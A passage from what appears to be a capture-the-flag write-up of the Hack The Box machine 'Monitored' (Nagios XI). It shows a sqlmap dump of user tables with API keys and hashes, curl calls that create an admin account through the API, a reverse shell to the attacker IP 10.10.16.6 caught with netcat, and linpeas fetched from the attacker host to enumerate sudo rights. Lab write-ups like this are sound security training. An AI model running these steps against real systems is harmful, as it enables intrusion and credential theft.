</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>Database: nagiosxi
</span></span></span><span class=line><span class=cl><span class=go>[22 tables]
</span></span></span><span class=line><span class=cl><span class=go>+-----------------------------+
</span></span></span><span class=line><span class=cl><span class=go>| xi_auditlog                 |
</span></span></span><span class=line><span class=cl><span class=go>| xi_auth_tokens              |
</span></span></span><span class=line><span class=cl><span class=go>| xi_banner_messages          |
</span></span></span><span class=line><span class=cl><span class=go>| xi_cmp_ccm_backups          |
</span></span></span><span class=line><span class=cl><span class=go>| xi_cmp_favorites            |
</span></span></span><span class=line><span class=cl><span class=go>| xi_cmp_nagiosbpi_backups    |
</span></span></span><span class=line><span class=cl><span class=go>| xi_cmp_scheduledreports_log |
</span></span></span><span class=line><span class=cl><span class=go>| xi_cmp_trapdata             |
</span></span></span><span class=line><span class=cl><span class=go>| xi_cmp_trapdata_log         |
</span></span></span><span class=line><span class=cl><span class=go>| xi_commands                 |
</span></span></span><span class=line><span class=cl><span class=go>| xi_deploy_agents            |
</span></span></span><span class=line><span class=cl><span class=go>| xi_deploy_jobs              |
</span></span></span><span class=line><span class=cl><span class=go>| xi_eventqueue               |
</span></span></span><span class=line><span class=cl><span class=go>| xi_events                   |
</span></span></span><span class=line><span class=cl><span class=go>| xi_link_users_messages      |
</span></span></span><span class=line><span class=cl><span class=go>| xi_meta                     |
</span></span></span><span class=line><span class=cl><span class=go>| xi_mibs                     |
</span></span></span><span class=line><span class=cl><span class=go>| xi_options                  |
</span></span></span><span class=line><span class=cl><span class=go>| xi_sessions                 |
</span></span></span><span class=line><span class=cl><span class=go>| xi_sysstat                  |
</span></span></span><span class=line><span class=cl><span class=go>| xi_usermeta                 |
</span></span></span><span class=line><span class=cl><span class=go>| xi_users                    |
</span></span></span><span class=line><span class=cl><span class=go>+-----------------------------+
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><ul><li>And dump the user and passwords from <code>xi_users</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sqlmap -u &#39;https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=3&#39; -p &#39;id&#39; --cookie=&#39;nagiosxi=dkkthk9urkl17li0bsrn5r2t96&#39; --batch -D nagiosxi -T xi_users --dump
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Database: nagiosxi
</span></span></span><span class=line><span class=cl><span class=go>Table: xi_users
</span></span></span><span class=line><span class=cl><span class=go>[2 entries]
</span></span></span><span class=line><span class=cl><span class=go>+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
</span></span></span><span class=line><span class=cl><span class=go>| user_id | email               | name                 | api_key                                                          | enabled | password                                                     | username    | created_by | last_login | api_enabled | last_edited | created_time | last_attempt | backend_ticket                                                   | last_edited_by | login_attempts | last_password_change |
</span></span></span><span class=line><span class=cl><span class=go>+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
</span></span></span><span class=line><span class=cl><span class=go>| 1       | admin@monitored.htb | Nagios Administrator | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL | 1       | $2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C | nagiosadmin | 0          | 1701931372 | 1           | 1701427555  | 0            | 0            | IoAaeXNLvtDkH5PaGqV2XZ3vMZJLMDR0                                 | 5              | 0              | 1701427555           |
</span></span></span><span class=line><span class=cl><span class=go>| 2       | svc@monitored.htb   | svc                  | 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK | 0       | $2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK | svc         | 1          | 1699724476 | 1           | 1699728200  | 1699634403   | 1715386179   | 6oWBPbarHY4vejimmu3K8tpZBNrdHpDgdUEs5P2PFZYpXSuIdrRMYgk66A0cjNjq | 1              | 4              | 1699697433           |
</span></span></span><span class=line><span class=cl><span class=go>+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><ul><li>Where we find users and hashed passwords. I try to crack these passwords but got nothing</li><li>We also have some <code>api_key</code> parameter, which is <code>IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL</code> for <code>admin</code> user.</li><li>Based on some previous API endpoints we have found previously, and also as was shown in <code>Nagios XI</code> documentation, the <code>api_key</code> might be required at:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>/nagiosxi/api/vi/admin?apikey=&lt;API-KEY&gt;
</span></span></code></pre></div><ul><li>If I use <code>api_key</code> found from <code>SQL</code> database for user <code>svc</code> with <code>cURL</code> to this endpoint I get:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s &#39;https://nagios.monitored.htb/nagiosxi/api/v1/admin?apikey=2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK&#39; --insecure
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>{&#34;error&#34;:&#34;Account is disabled&#34;}
</span></span></span></code></pre></div><p>and if I use <code>admin</code> <code>api_key</code> from the database I get:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s &#39;https://nagios.monitored.htb/nagiosxi/api/v1/admin?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&#39; --insecure
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>No Endpoint: admin
</span></span></span></code></pre></div><p>so we need to find a correct endpoint</p><ul><li>Following the instructions from <a href="https://support.nagios.com/forum/viewtopic.php?f=16&amp;t=42923" class=external-link target=_blank rel=noopener>this forum post</a> we can see how to create new users. More specifically, the following part is interesting:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>curl -XPOST &#34;http://x.x.x.x/nagiosxi/api/v1/system/user?apikey=LTltbjobR0X3V5ViDIitYaI8hjsjoFBaOcWYukamF7oAsD8lhJRvSPWq8I3PjTf7&amp;pretty=1&#34; -d &#34;username=jmcdouglas&amp;password=test&amp;name=Jordan%20McDouglas&amp;email=jmcdouglas@localhost&#34;
</span></span></span><span class=line><span class=cl><span class=go>{
</span></span></span><span class=line><span class=cl><span class=go>    &#34;success&#34;: &#34;User account jmcdouglas was added successfully!&#34;,
</span></span></span><span class=line><span class=cl><span class=go>    &#34;userid&#34;: 13
</span></span></span><span class=line><span class=cl><span class=go>}
</span></span></span></code></pre></div><p>so I replace the <code>apikey</code> value with my <code>admin</code> value and add a user with credentials <code>gunzf0x:gunzf0x123</code>. I do this running the following command with <code>cURL</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s -X POST --insecure &#39;https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&#39; -d &#39;username=gunzf0x&amp;password=gunzf0x123&amp;name=Tester&amp;email=gunzf0x@htb.com&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>{&#34;success&#34;:&#34;User account gunzf0x was added successfully!&#34;,&#34;user_id&#34;:6}
</span></span></span></code></pre></div><ul><li>I can log in with this user, at <code>https://nagios.monitored.htb/nagiosxi/login.php</code>, but I see the same panel as <code>svc</code> user. So what if we can add &ldquo;admin&rdquo; privileges to this user when we create it? As it is explained in <a href="https://support.nagios.com/forum/viewtopic.php?f=6&amp;t=40502" class=external-link target=_blank rel=noopener>this post</a>, we can add <code>auth_level=admin</code> parameter when creating the user. So I create a new user called <code>gunzf0x2</code> and the same credentials.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s -X POST --insecure &#39;https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&#39; -d &#39;username=gunzf0x2&amp;password=gunzf0x123&amp;name=Tester&amp;email=gunzf0x@htb.com&amp;auth_level=admin&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>{&#34;success&#34;:&#34;User account gunzf0x2 was added successfully!&#34;,&#34;user_id&#34;:7}
</span></span></span></code></pre></div><ul><li>I also note that I can check created users if we visit the following endpoint, but with a <code>GET</code> request:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s --insecure &#39;https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&#39; | jq
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>{
</span></span></span><span class=line><span class=cl><span class=go>  &#34;records&#34;: 4,
</span></span></span><span class=line><span class=cl><span class=go>  &#34;users&#34;: [
</span></span></span><span class=line><span class=cl><span class=go>    {
</span></span></span><span class=line><span class=cl><span class=go>      &#34;user_id&#34;: &#34;7&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;username&#34;: &#34;gunzf0x2&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;name&#34;: &#34;Tester&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;email&#34;: &#34;gunzf0x@htb.com&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;enabled&#34;: &#34;1&#34;
</span></span></span><span class=line><span class=cl><span class=go>    },
</span></span></span><span class=line><span class=cl><span class=go>    {
</span></span></span><span class=line><span class=cl><span class=go>      &#34;user_id&#34;: &#34;6&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;username&#34;: &#34;gunzf0x&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;name&#34;: &#34;Tester&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;email&#34;: &#34;gunzf0x@htb.com&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;enabled&#34;: &#34;1&#34;
</span></span></span><span class=line><span class=cl><span class=go>    },
</span></span></span><span class=line><span class=cl><span class=go>    {
</span></span></span><span class=line><span class=cl><span class=go>      &#34;user_id&#34;: &#34;2&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;username&#34;: &#34;svc&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;name&#34;: &#34;svc&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;email&#34;: &#34;svc@monitored.htb&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;enabled&#34;: &#34;0&#34;
</span></span></span><span class=line><span class=cl><span class=go>    },
</span></span></span><span class=line><span class=cl><span class=go>    {
</span></span></span><span class=line><span class=cl><span class=go>      &#34;user_id&#34;: &#34;1&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;username&#34;: &#34;nagiosadmin&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;name&#34;: &#34;Nagios Administrator&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;email&#34;: &#34;admin@monitored.htb&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;enabled&#34;: &#34;1&#34;
</span></span></span><span class=line><span class=cl><span class=go>    }
</span></span></span><span class=line><span class=cl><span class=go>  ]
</span></span></span><span class=line><span class=cl><span class=go>}
</span></span></span></code></pre></div><p>and I can see my 2 users created there.</p><ul><li>So I go again to the login panel, but this time I enter with the second added user. Similar as the first account, the page will ask to accept some terms that I have obviously read and change the password. Once done that now I note that we have a panel slightly different:</li></ul><p><img alt="Monitored 8" src=/pentesting/images/Monitored_8.png></p><p>The main difference now is that now I can see a <code>Configure</code> and <code>Admin</code> options.</p><ul><li>If I go to <code>Configure -> Core Config Manager</code> I can see something like:</li></ul><p><img alt="Monitored 9" src=/pentesting/images/Monitored_9.png></p><ul><li>If we click on <code>Commands</code> we can see multiple tasks:</li></ul><p><img alt="Monitored 10" src=/pentesting/images/Monitored_10.png></p><ul><li>Clicking on <code>Add New</code> I add a new command called <code>rev-shell</code> and add the following content:</li></ul><p><img alt="Monitored 11" src=/pentesting/images/Monitored_11.png></p><p>where <code>10.10.16.6</code> is my attacker IP and <code>443</code> is the port I will start listening with <code>netcat</code>. I notice that all the commands previously added use absolute paths for binaries so I did the same using <code>/bin/bash</code> instead of only <code>bash</code>.</p><ul><li>Click on <code>Save</code> and, then, from the command list go to the bottom of the page and click on <code>Apply Configuration</code>. Then, go back again to <code>Configure -> Core Config Manager</code>, but this time click on <code>Services</code>, <code>Add-New</code> (Service) and create a new service:</li></ul><p><img alt="Monitored 12" src=/pentesting/images/Monitored_12.png></p><p>At the bottom of this page we have a button called <code>Run Check Command</code>. When I click on it a Pop-up window appears:
<img alt="Monitored 13" src=/pentesting/images/Monitored_13.png></p><ul><li>Before clicking on <code>Run Check Command</code> I start a <code>netcat</code> listener on port <code>443</code>. Once listening, I click on <code>Run Check Command</code> and get a shell as <code>nagios</code> user:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.248] 48276
</span></span></span><span class=line><span class=cl><span class=go>bash: cannot set terminal process group (16894): Inappropriate ioctl for device
</span></span></span><span class=line><span class=cl><span class=go>bash: no job control in this shell
</span></span></span><span class=line><span class=cl><span class=go>nagios@monitored:~$ whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>nagios
</span></span></span></code></pre></div><p>where we can get the user flag at the current directory.</p><h2 id=root>Root
<a class=heading-link href=#root><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>I pass <code>LinPEAS</code> (which can be obtained from <a href=https://github.com/peass-ng/PEASS-ng/releases/tag/20240505-284a0ce8 class=external-link target=_blank rel=noopener>its repository</a>) to the target machine starting a temporal <code>Python</code> <code>HTTP</code> server on port <code>8080</code> where <code>linpeas.sh</code> file is located:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ lsd &amp;&amp; python3 -m http.server 8080
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Ôíâ install_nvim.sh  Ôíâ installNerdFonts.sh  Ôíâ linpeas.sh
</span></span></span><span class=line><span class=cl><span class=go>Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
</span></span></span></code></pre></div><p>and download it to the target machine, running on it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>nagios@monitored:~$ wget http://10.10.16.6:8080/linpeas.sh
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>--2024-05-10 23:03:40--  http://10.10.16.6:8080/linpeas.sh
</span></span></span><span class=line><span class=cl><span class=go>Connecting to 10.10.16.6:8080... connected.
</span></span></span><span class=line><span class=cl><span class=go>HTTP request sent, awaiting response... 200 OK
</span></span></span><span class=line><span class=cl><span class=go>Length: 847815 (828K) [text/x-sh]
</span></span></span><span class=line><span class=cl><span class=go>Saving to: ‚Äòlinpeas.sh‚Äô
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>linpeas.sh                              100%[============================================================================&gt;] 827.94K   111KB/s    in 7.5s
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>2024-05-10 23:03:50 (111 KB/s) - ‚Äòlinpeas.sh‚Äô saved [847815/847815]
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>nagios@monitored:~$ mv ./linpeas.sh /tmp/linpeas.sh
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>nagios@monitored:~$ chmod +x !$
</span></span></span><span class=line><span class=cl><span class=go>chmod +x /tmp/linpeas.sh
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>nagios@monitored:~$ !$
</span></span></span><span class=line><span class=cl><span class=go>/tmp/linpeas.sh
</span></span></span></code></pre></div><ul><li>From the output I can see something interesting:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Readable files belonging to root and readable by me but not world readable
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 3820 Nov  9  2023 /usr/local/nagiosxi/scripts/manage_ssl_config.sh
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 7861 Nov  9  2023 /usr/local/nagiosxi/scripts/backup_xi.sh
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 9615 Nov  9  2023 /usr/local/nagiosxi/scripts/pg2mysql/convert_nagiosxi_to_mysql.php
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 6166 Nov  9  2023 /usr/local/nagiosxi/scripts/reset_config_perms.sh
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 1654 Nov  9  2023 /usr/local/nagiosxi/scripts/repair_databases.sh
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 1914 Nov  9  2023 /usr/local/nagiosxi/scripts/change_timezone.sh
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 1270 Nov  9  2023 /usr/local/nagiosxi/scripts/import_xiconfig.php
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 3917 Nov  9  2023 /usr/local/nagiosxi/scripts/manage_services.sh
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 4153 Nov  9  2023 /usr/local/nagiosxi/scripts/repairmysql.sh
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 2914 Nov  9  2023 /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 1534 Nov  9  2023 /usr/local/nagiosxi/scripts/send_to_nls.php
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 281115 Nov  9  2023 /usr/local/nagiosxi/scripts/components/autodiscover_new.php
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 16693 Nov  9  2023 /usr/local/nagiosxi/scripts/components/getprofile.sh
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 6296 Nov  9  2023 /usr/local/nagiosxi/scripts/migrate/nagios_bundler.py
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 8612 Nov  9  2023 /usr/local/nagiosxi/scripts/migrate/migrate.php
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 18851 Nov  9  2023 /usr/local/nagiosxi/scripts/migrate/nagios_unbundler.py
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 999 Nov  9  2023 /usr/local/nagiosxi/etc/xi-sys.cfg
</span></span></span><span class=line><span class=cl><span class=go>-rw-r----- 1 root nagios 33 May 10 18:50 /home/nagios/user.txt
</span></span></span></code></pre></div><p>the file <code>/usr/local/nagiosxi/scripts/manage_services.sh</code> seems interesting.</p><ul><li>I also note that this file can be run as <code>root</code> without providing any password:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Checking &#39;sudo -l&#39;, /etc/sudoers, and /etc/sudoers.d
</span></span></span><span class=line><span class=cl><span class=go>‚ïö https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
</span></span></span><span class=line><span class=cl><span class=go>Matching Defaults entries for nagios on localhost:
</span></span></span><span class=line><span class=cl><span class=go>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>User nagios may run the following commands on localhost:
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /etc/init.d/nagios start
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /etc/init.d/nagios stop
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /etc/init.d/nagios restart
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /etc/init.d/nagios reload
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /etc/init.d/nagios status
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /etc/init.d/nagios checkconfig
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /etc/init.d/npcd start
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /etc/init.d/npcd stop
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /etc/init.d/npcd restart
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /etc/init.d/npcd reload
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /etc/init.d/npcd status
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/migrate/migrate.php *
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
</span></span></span></code></pre></div><ul><li>Checking the file <code>manage_services.sh</code> we have:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Manage Services (start/stop/restart)</span>
</span></span><span class=line><span class=cl><span class=c1># Copyright (c) 2015-2020 Nagios Enterprises, LLC. All rights reserved.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># =====================</span>
</span></span><span class=line><span class=cl><span class=c1># Built to allow start/stop/restart of services using the proper method based on</span>
</span></span><span class=line><span class=cl><span class=c1># the actual version of operating system.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Examples:</span>
</span></span><span class=line><span class=cl><span class=c1># ./manage_services.sh start httpd</span>
</span></span><span class=line><span class=cl><span class=c1># ./manage_services.sh restart mysqld</span>
</span></span><span class=line><span class=cl><span class=c1># ./manage_services.sh checkconfig nagios</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>BASEDIR</span><span class=o>=</span><span class=k>$(</span>dirname <span class=k>$(</span>readlink -f <span class=nv>$0</span><span class=k>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Import xi-sys.cfg config vars</span>
</span></span><span class=line><span class=cl>. <span class=nv>$BASEDIR</span>/../etc/xi-sys.cfg
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Things you can do</span>
</span></span><span class=line><span class=cl><span class=nv>first</span><span class=o>=(</span><span class=s2>&#34;start&#34;</span> <span class=s2>&#34;stop&#34;</span> <span class=s2>&#34;restart&#34;</span> <span class=s2>&#34;status&#34;</span> <span class=s2>&#34;reload&#34;</span> <span class=s2>&#34;checkconfig&#34;</span> <span class=s2>&#34;enable&#34;</span> <span class=s2>&#34;disable&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=nv>second</span><span class=o>=(</span><span class=s2>&#34;postgresql&#34;</span> <span class=s2>&#34;httpd&#34;</span> <span class=s2>&#34;mysqld&#34;</span> <span class=s2>&#34;nagios&#34;</span> <span class=s2>&#34;ndo2db&#34;</span> <span class=s2>&#34;npcd&#34;</span> <span class=s2>&#34;snmptt&#34;</span> <span class=s2>&#34;ntpd&#34;</span> <span class=s2>&#34;crond&#34;</span> <span class=s2>&#34;shellinaboxd&#34;</span> <span class=s2>&#34;snmptrapd&#34;</span> <span class=s2>&#34;php-fpm&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Helper functions</span>
</span></span><span class=line><span class=cl><span class=c1># -----------------------</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>contains <span class=o>()</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>local</span> <span class=nv>array</span><span class=o>=</span><span class=s2>&#34;</span><span class=nv>$1</span><span class=s2>[@]&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>local</span> <span class=nv>seeking</span><span class=o>=</span><span class=nv>$2</span>
</span></span><span class=line><span class=cl>    <span class=nb>local</span> <span class=nv>in</span><span class=o>=</span><span class=m>1</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> element in <span class=s2>&#34;</span><span class=si>${</span><span class=p>!array</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>;</span> <span class=k>do</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=sb>`</span> <span class=s2>&#34;</span><span class=nv>$element</span><span class=s2>&#34;</span> <span class=o>==</span> <span class=s2>&#34;</span><span class=nv>$seeking</span><span class=s2>&#34;</span> <span class=sb>`</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>            <span class=nv>in</span><span class=o>=</span><span class=m>0</span>
</span></span><span class=line><span class=cl>            <span class=nb>break</span>
</span></span><span class=line><span class=cl>        <span class=k>fi</span>
</span></span><span class=line><span class=cl>    <span class=k>done</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$in</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Verify to avoid abuse</span>
</span></span><span class=line><span class=cl><span class=c1># -----------------------</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Check to verify the proper usage format</span>
</span></span><span class=line><span class=cl><span class=c1># ($1 = action, $2 = service name)</span>
</span></span><span class=line><span class=cl>
